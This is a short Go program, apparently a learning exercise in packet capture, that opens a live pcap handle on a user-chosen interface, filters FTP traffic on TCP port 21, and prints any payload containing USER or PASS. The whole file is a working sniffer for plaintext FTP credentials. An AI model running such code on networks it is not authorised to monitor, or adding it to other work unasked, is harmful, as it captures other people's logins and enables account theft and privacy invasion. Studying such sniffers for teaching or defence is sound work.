package main

import (
	"bytes"
	"fmt"
	"log"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

var foundDevName = false

func main() {
	// Get all interfaces on the machine
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Panicln("Cannot fetch network interfaces")
	}

	var devNameFromUser string
	fmt.Println("Please Enter the name of the device you want to sniff:")

	fmt.Scanln(&devNameFromUser)

	// Check whether there exists the device with the given name
	for _, ifDev := range devices {
		if ifDev.Name == devNameFromUser {
			foundDevName = true
		}
	}

	if !foundDevName {
		log.Panicln("Cannot find the given device")
	}

	// Open the handle on the network interface with the device
	handle, err := pcap.OpenLive(devNameFromUser, 1600, false, pcap.BlockForever)
	if err != nil {
		fmt.Print(err)
		log.Panicln("Cannot open handle on the given device")
	}
	defer handle.Close()

	// Filter the packets that you want to sniff
	if err := handle.SetBPFFilter("tcp and port 21"); err != nil {
		log.Panicln(err)
	}

	source := gopacket.NewPacketSource(handle, handle.LinkType())

	// Display them on the screen (or use it to do anything you desire)
	for packet := range source.Packets() {
		appLayer := packet.ApplicationLayer()
		if appLayer == nil {
			continue
		}

		data := appLayer.Payload()
		if bytes.Contains(data, []byte("USER")) || bytes.Contains(data, []byte("PASS")) {
			fmt.Println(string(data))
		}
	}
}
